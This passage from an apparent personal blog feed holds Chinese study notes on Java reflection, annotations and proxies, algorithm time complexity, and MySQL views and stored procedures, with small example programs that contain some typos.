class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package javahight;</span><br><span class="line"></span><br><span class="line">import org.junit.Test;</span><br><span class="line"></span><br><span class="line">import java.io.ObjectStreamException;</span><br><span class="line"></span><br><span class="line">public class Test1Class&#123;</span><br><span class="line">    @Test</span><br><span class="line">    public void save() throws Exception &#123;</span><br><span class="line">        Students s1 = new Students(&quot;zhou&quot;,&quot;18&quot;);</span><br><span class="line">        ObjectSaver.saveObject(s1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ObjectSaver.java</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">package javahight;</span><br><span class="line"></span><br><span class="line">import java.io.File;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.PrintStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line">public class ObjectSaver &#123; // 修改类名避免与 java.lang.Object 冲突</span><br><span class="line">    public static void saveObject(Object obj) throws Exception &#123;</span><br><span class="line">        // 设置文件路径，确保路径有效</span><br><span class="line">        PrintStream ps = new PrintStream(new FileOutputStream(&quot;output.txt&quot;, true));</span><br><span class="line">        Class c = obj.getClass();//反射第一步</span><br><span class="line">        Field[] fields = c.getDeclaredFields();//获取成员变量</span><br><span class="line">        String cName = c.getSimpleName();//获取简短名称</span><br><span class="line">        ps.println(&quot;------&quot; + cName + &quot;-------&quot;);//输出-----Students----</span><br><span class="line">        for (Field field : fields) &#123;</span><br><span class="line">            String name = field.getName();//获取名字</span><br><span class="line">            field.setAccessible(true); // 修正为 field.setAccessible(true)//遍历成员变量</span><br><span class="line">            String value = field.get(obj) + &quot;&quot;;//获取值</span><br><span class="line">            ps.println(name + &quot;=&quot; + value);//输出</span><br><span class="line">        &#125;</span><br><span class="line">        ps.close(); // 关闭 PrintStream</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Students.java</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">package javahight;</span><br><span class="line"></span><br><span class="line">class Students &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private int age;</span><br><span class="line"></span><br><span class="line">    public Students(String name, int age) &#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public String toString() &#123;</span><br><span class="line">        return &quot;Students&#123;name=&#x27;&quot; + name + &quot;&#x27;, age=&quot; + age + &quot;&#125;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>output.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">------Students-------</span><br><span class="line">name=zhou</span><br><span class="line">age=18</span><br></pre></td></tr></table></figure><h2 id="注解-2">注解</h2><p>java代码里的特殊标记，让其他程序根据注解信息来怎么执行程序</p><p>可以用在类/构造器/方法/成员变量。。。</p><p>定义注解:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public @interface 注解名称&#123;</span><br><span class="line">public 属性类型 属性名() default 默认值；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@anntation(aaa=&quot;aaa&quot;,ccc=&quot;java&quot;)</span><br><span class="line">public class test &#123;</span><br><span class="line">    @anntation(aaa=&quot;aaaaaaa&quot;,ccc=&quot;ddddddd&quot;)</span><br><span class="line">    public void test2()&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public @interface anntation &#123;</span><br><span class="line">    String aaa();</span><br><span class="line">    boolean bbb() default true;</span><br><span class="line">    String [] ccc();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>例如：</p><p><strong>特殊情况</strong></p><p>如果注解只有一个值而且为value value可以省略</p><p>注解的原理：</p><p>注解的本质是</p><ul><li>是一个接口，继承自Annotation</li><li>使用@注解的适合，就是一个实现类对象，实现了注解以及Annotation</li></ul><h4 id="元注解">元注解</h4><p><strong>修饰注解的注解</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">@Target(ElementType.TYPE)//声明被修饰的注解只能在哪使用</span><br><span class="line">@Retention(RetentionPolicy.CLASS)//注解的保留周期</span><br><span class="line">public @interface anntation &#123;</span><br><span class="line">    String aaa();</span><br><span class="line">    boolean bbb() default true;</span><br><span class="line">    String [] ccc();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面那两个就是元注解</p><p>Target（ElementType.TYPE）注解：</p><ul><li>Type 类 接口</li><li>FIELD 成员变量</li><li>METHOD 成员方法</li><li>PARAMETER 方法参数</li><li>CONSTRUCTOR 构造器</li><li>LOCAL_VARIBLE 局部变量</li></ul><p>Retention()</p><ul><li>SOURCE 源码阶段</li><li>CLASS 字节码文件</li><li><strong>RUNTIME 运行的阶段</strong>  运用最多的</li></ul><h4 id="注解的解析">注解的解析</h4><p>要解析谁上的注解，就应该先拿到谁</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">public class testannotation &#123;</span><br><span class="line">    @Test</span><br><span class="line">    public void parseClass()&#123;</span><br><span class="line">        Class c = test.class;</span><br><span class="line">        //判断类上是不是包含了注解</span><br><span class="line">        if(c.isAnnotationPresent(anntation.class)) &#123;</span><br><span class="line">            (anntation) c.getDeclaredAnnotations(anntation.class);</span><br><span class="line">            System.out.println();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解析类的对象</p><h4 id="应用场景">应用场景</h4><p>配合反射做框架的</p><p>MyTest.java</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.annotation.ElementType;</span><br><span class="line">import java.lang.annotation.Retention;</span><br><span class="line">import java.lang.annotation.RetentionPolicy;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line"></span><br><span class="line">@Target(ElementType.METHOD)</span><br><span class="line">@Retention(RetentionPolicy.RUNTIME)</span><br><span class="line">public @interface MyTest &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Test1.java</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">public class Test1 &#123;</span><br><span class="line"></span><br><span class="line">    public static class Test &#123;</span><br><span class="line">        @MyTest</span><br><span class="line">        public void test1() &#123;</span><br><span class="line">            System.out.println(&quot;aaaaaa&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Test a = new Test();</span><br><span class="line">            Class&lt;?&gt; c = Test.class;</span><br><span class="line">            Method[] methods = c.getDeclaredMethods();</span><br><span class="line">            for (Method method : methods) &#123;</span><br><span class="line">                if (method.isAnnotationPresent(MyTest.class)) &#123;</span><br><span class="line">                    method.invoke(a);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>return:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaaaa</span><br></pre></td></tr></table></figure><h2 id="动态代理">动态代理</h2><p>程序为什么要代理？</p><p>使用接口进行代理</p><p>建立了一个初级的代理：</p><p>BigStar.java</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class BigStar implements Star &#123;</span><br><span class="line">    private String name;//java约定俗称的</span><br><span class="line">    public BigStar(String name)&#123;</span><br><span class="line">        this.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    public void sing(String name)&#123;</span><br><span class="line">        System.out.println(this.name + &quot;正在唱&quot;+ name);</span><br><span class="line">    &#125;</span><br><span class="line">    public void dance()&#123;</span><br><span class="line">        System.out.println(this.name+&quot;正在跳舞&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Star.java</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public interface Star &#123;</span><br><span class="line">    void sing(String name);</span><br><span class="line">    void dance();//两个方法都</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>将对象的东西转移到代理上，这是个初级的运用</strong></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构 basic</title>
      <link href="/2024/08/03/date1/"/>
      <url>/2024/08/03/date1/</url>
      
        <content type="html"><![CDATA[<h1>数据结构 basic</h1><h2 id="介绍：">介绍：</h2><p>数据结构：计算机存储组织数据的方式，相互搭建一种或多种特定关系的数据元素的集合。在内存中将数据存储起来。</p><p>算法：定义良好的计算的过程</p><p><strong><strong><strong><strong>十分重要，要学扎实</strong></strong></strong></strong></p><h2 id="算法效率的分析">算法效率的分析</h2><p>评估算法的好坏，评估他的空间和时间。分别是时间复杂度和空间复杂度</p><p>现在关注时间复杂度更多</p><p>时间复杂度是一个函数（数学中带有未知数的函数表达式），算法中基本操作的执行次数，为算法的时间复杂度</p><p>环境不同，执行的时间就会不同。</p><h3 id="嵌套循环的时间复杂度">嵌套循环的时间复杂度</h3><p>时间复杂度的函数式①：</p><p>F(N)=N<em>N+2</em>N+10</p><p>把上面的式子简化，只留影响最大的一项。**n越大，后两项对结果的影响就越小。**算个大概就行了</p><p>时间复杂度不需要精确的数值</p><p>用了O的渐进表示法，保留影响最大的就行了，就是一个大概的值</p><p>所以时间复杂度O（N^2）</p><p>O的渐进表示法：</p><ul><li>如果有常数就用1去替代</li><li>只保留最高阶项</li><li>最高阶项存在但不是1，则去除与这个项目相乘的常数，得到就是大O阶</li></ul><p><strong>一般情况下时间复杂度计算时，未知数都是用的N，别的也是可以的</strong></p><p>根据条件，可将O继续缩小</p><p>常数：</p><p>O（1）是指的能够运算常数次，不是仅仅代表算法只能运行一次</p><h3 id="strchar">strchar</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">while(*str)&#123;</span><br><span class="line">if(*str == character)</span><br><span class="line">return str;</span><br><span class="line">else </span><br><span class="line">++str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用来查找一个字符串的函数</p><p>这个算法是有变化的，查找的东西不同，其时间复杂度就会不同</p><p>分为三种情况</p><ul><li>最好 下界</li><li>最坏 上界</li><li>平均 期望</li></ul><p><strong>一个算法随着输入不同，时间复杂度不同，时间复杂度就会做悲观预期，就是看最坏的情况：</strong></p><p>O（N）</p><p>计算的太复杂，可能会看平均值</p><h3 id="冒泡排序">冒泡排序</h3><p>精确的冒泡排序时间复杂度：</p><p><strong>算法不能只看代码，要看过程</strong></p><p>F(n) = n*(N-1)/2=N^2</p><h3 id="二分查找">二分查找</h3><p>最好的情况O（1）</p><p>最坏情况O（）查找次数是：<strong>查找log以2为底N的对数</strong></p><p>在n个数中一共查找log以2为底N的对数次</p>]]></content>
      
      
      <categories>
          
          <category> 408 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql 存储对象</title>
      <link href="/2024/08/01/mysql10/"/>
      <url>/2024/08/01/mysql10/</url>
      
        <content type="html"><![CDATA[<h1>Mysql 存储对象</h1><h2 id="视图">视图</h2><h3 id="介绍">介绍</h3><p>是一种虚拟存在的表，视图中的数据在数据库中不存在。行和列数据来自自定义视图查询使用的表，视图不保存数据，只是保存了sql的逻辑。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create [or replace] view 视图名称&#123;（列表名称）&#125; as select语句 []</span><br></pre></td></tr></table></figure><p>演示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create or replace view stu_v_1 as select id,name from student where id &lt;= 10;</span><br></pre></td></tr></table></figure><p>创建了一个视图</p><p>查询视图：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show create view 视图名称</span><br><span class="line">select from 视图名称....是一个虚拟存在的表，可以像表一样进行操作。</span><br></pre></td></tr></table></figure><p>修改视图：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">修改和创建视图的语法是一样的</span><br><span class="line">alter view 视图名称【（视图列表）】 as select语句；</span><br></pre></td></tr></table></figure><p>删除视图：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop view [if exists] 视图名称 [视图名称];</span><br></pre></td></tr></table></figure><h3 id="视图操作和检查选项">视图操作和检查选项</h3><p>在select语句后面加上with casecaded check option加上一个检查选项.就可以避免后来又插入了一些数据，，一些插入到数据不属于selcet语句的要求。</p><p>会通过视图检查正在更改的每个行，mysql允许基于一个视图去关联另一个视图</p><p>默认值为casecaded 还有一个值为local</p><p>local：</p><p>使用local只会看当前是不是满足，然后会递归去寻找他的源视图的条件，如果没有检查选项，就不进行条件的检查，有检查选项就会进行检查</p><p>casecaded：</p><p>使用casecaded的时候会看当前的是不是满足，然后会递归去寻找他源视图的条件。相当于源视图里也加上了一个with casecaded check option</p><h3 id="视图-更新">视图-更新</h3><p>视图更新的条件：</p><ul><li>视图中的行必须和基础表中的行存在一一对应的关系，如果包含以下的任意一种情况，则该视图不可更新</li><li>聚合函数或者窗口函数(sum() max() min() count())</li><li>distinct</li><li>group by</li><li>having</li><li>union 或者 union all</li></ul><h3 id="视图的作用">视图的作用</h3><ul><li><p>简化操作</p></li><li><p>安全</p></li><li><p>数据独立</p></li></ul><h3 id="案例">案例</h3><p>创建一个视图，只能看见要屏蔽某某字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> tab_user_name <span class="keyword">as</span> <span class="keyword">select</span> id,name,...<span class="keyword">from</span> tb_user;</span><br></pre></td></tr></table></figure><p>查询每个学生的课程（三表联查）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selcet <span class="operator">*</span> <span class="keyword">from</span> student s,student_course sc,course c <span class="keyword">where</span> s.id <span class="operator">=</span> sc.studentid <span class="keyword">and</span> sc.id <span class="operator">=</span>  c.id;</span><br></pre></td></tr></table></figure><p>先写出三张表的联查sql语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">view</span> tab_stu_course_view <span class="keyword">as</span> selcet s.name studentname,s.no student_no,c.name course_name <span class="keyword">from</span> student s,student_course sc,course c <span class="keyword">where</span> s.id <span class="operator">=</span> sc.studentid <span class="keyword">and</span> sc.id <span class="operator">=</span>  c.id;</span><br></pre></td></tr></table></figure><p>然后直接查询这个视图</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tab_stu_course_view;</span><br></pre></td></tr></table></figure><h2 id="存储过程">存储过程</h2><h3 id="介绍-2">介绍</h3><p>是事先通过编译并存储在数据库中一段sql语句的集合，可以简化工作，减少数据在数据库和应用服务器之间的传输</p><p>就是sql语句语言层面的代码封装和重用</p><p>特点：</p><ul><li>封装，重用</li><li>可以接受参数，也可以返回数据</li><li>减少网络交互，提升效率</li></ul><p>创建：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create procedure 存储过程名称（【参数列表】）</span><br><span class="line">begin</span><br><span class="line">sql语句</span><br><span class="line">end;</span><br></pre></td></tr></table></figure><p>调用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call 名称([参数])；</span><br></pre></td></tr></table></figure><p>查看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show * from information_schema.routines where routine_schema = &#x27;xxxx&#x27;查询xxxx数据库的存储过程和状态</span><br><span class="line">show create procedure 存储过程名称；查询某个存储过程的定义</span><br></pre></td></tr></table></figure><p>删除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drop procedure [if exists] 存储过程名称；</span><br></pre></td></tr></table></figure><p>在命令行中运行会有小bug</p><p>当在命令行中运行的时候，看到分号说明语句已经结束了</p><p>在命令行中需要使用delimiter来指定结束($$)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> delimiter $$</span><br><span class="line"> <span class="keyword">create</span> <span class="keyword">procedure</span> 存储过程名称（【参数列表】）beginsql语句<span class="keyword">end</span>$$</span><br></pre></td></tr></table></figure><p>结束符变成了$$</p><h3 id="变量">变量</h3><p>系统变量：</p><p>mysql中服务器自己提供的变量</p><p>全局变量和会话变量</p><p>全局的是所有的都会使用，会话变量只是在当前会话应用的变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show [session|global].variables;查看所有系统变量</span><br><span class="line">show [session|global].variables like &#x27;&#x27;;模糊匹配</span><br><span class="line">show @@[session|global].系统变量名；查看指定的变量</span><br></pre></td></tr></table></figure><p>设置系统变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set [session|global].系统变量名= 值；</span><br><span class="line">set @@[session|global].系统变量 = 值；</span><br></pre></td></tr></table></figure><p>不指定默认是session</p><p>用户自定义变量：</p><p>不需要提前声明</p><p>@变量名 就行了，只能在当前会话使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set @var_name = expr [,@var_name = expr];</span><br><span class="line">set @var_name ：= expr [,@var_name:= expr];</span><br></pre></td></tr></table></figure><p>还可以执行select语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select @var_name := expr [,@var_name := expr];</span><br><span class="line">select 字段名 into @var_name from tab_name;</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @var_name;</span><br></pre></td></tr></table></figure><p>=即可以当作赋值也可以比较 ：=做为赋值运算符</p><p>用户变量无需声明和初始化，没有赋值则作null值</p><p>局部变量：</p><p>在begin 和 end块里</p><p>声明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare 变量名 变量类型【default...]</span><br></pre></td></tr></table></figure><p>变量类型就是数据库字段的类型，例如int啥的</p><p>赋值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set 变量名 = 值；</span><br><span class="line">set 变量名 := 值；</span><br><span class="line">select 字段名 into 变量名 from tab_name...;</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">create procedure p1()</span><br><span class="line">begin</span><br><span class="line">declare stu_count int default 0;</span><br><span class="line">select count(*) into stu_count from sudents;</span><br><span class="line">select stu_count;</span><br><span class="line">end</span><br><span class="line">call p1();</span><br></pre></td></tr></table></figure><h3 id="条件判断">条件判断</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if 条件1 then</span><br><span class="line">elseif 条件2 then</span><br><span class="line">....</span><br><span class="line">else....</span><br><span class="line">end if;来结束</span><br></pre></td></tr></table></figure><p>还可以使用case</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CASE expression</span><br><span class="line">    WHEN value1 THEN result1</span><br><span class="line">    WHEN value2 THEN result2</span><br><span class="line">    ...</span><br><span class="line">    ELSE default_result</span><br><span class="line">END case;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果表达式成立，则进行</p><p>也可以不加条件判断，直接进行匹配</p><h3 id="参数">参数</h3><p>in输入参数默认的</p><p>out输出参数</p><p>inout既可以输入，也可以输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create procedure name(in/inout 参数名 参数类型)</span><br><span class="line">begin</span><br><span class="line">...</span><br><span class="line">end;</span><br></pre></td></tr></table></figure><p>例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">create procedure level(in score int,out result varchar(10))</span><br><span class="line">begin</span><br><span class="line">if score &gt;=80 then</span><br><span class="line">set result := &#x27;hao&#x27;;</span><br><span class="line">....</span><br><span class="line">else</span><br><span class="line">..</span><br><span class="line">end if;</span><br><span class="line">end;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">call level(68,@result);</span><br><span class="line">select @result;</span><br></pre></td></tr></table></figure><p>inout:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> <span class="keyword">return</span>(<span class="keyword">inout</span> score <span class="keyword">double</span>)</span><br><span class="line"><span class="keyword">begin</span></span><br><span class="line"><span class="keyword">set</span> socore :<span class="operator">=</span> score <span class="operator">*</span> <span class="number">0.5</span>;</span><br><span class="line"><span class="keyword">end</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> <span class="variable">@score</span> <span class="operator">=</span> <span class="number">78</span>;</span><br><span class="line"><span class="keyword">call</span> <span class="keyword">return</span>(<span class="variable">@scoure</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>concat函数，传递字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select concat (&#x27;aaaaa&#x27;变量....);</span><br></pre></td></tr></table></figure><h3 id="循环">循环</h3><h4 id="while">while</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">while 条件 do </span><br><span class="line">sql...</span><br><span class="line">end while;</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">procedure</span> p(<span class="keyword">in</span> n <span class="type">int</span>)</span><br><span class="line"><span class="keyword">begin</span> </span><br><span class="line"><span class="keyword">declare</span> total <span class="type">int</span> <span class="keyword">default</span> <span class="number">0</span>;</span><br><span class="line">whlie n<span class="operator">&gt;</span><span class="number">0</span> do </span><br><span class="line"><span class="keyword">set</span> total :<span class="operator">=</span> total <span class="operator">+</span> n;</span><br><span class="line"><span class="keyword">set</span> n :<span class="operator">=</span> n <span class="operator">-</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">end</span> while;</span><br><span class="line"><span class="keyword">select</span> total;</span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure><p>实现一个累加</p><h4 id="repeat">repeat</h4><p>满足条件的时候退出循环</p><p>先执行一次逻辑，看条件满足不满足</p><p>然后进行下面的操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">repeat</span><br><span class="line">sql....</span><br><span class="line">until 条件</span><br><span class="line">end repeat;</span><br></pre></td></tr></table></figure><h4 id="loop">loop</h4><p>可以实现死循环</p><p>leave 退出循环</p><p>iterate在循环中使用,进入下一次循环</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[begin_label:] 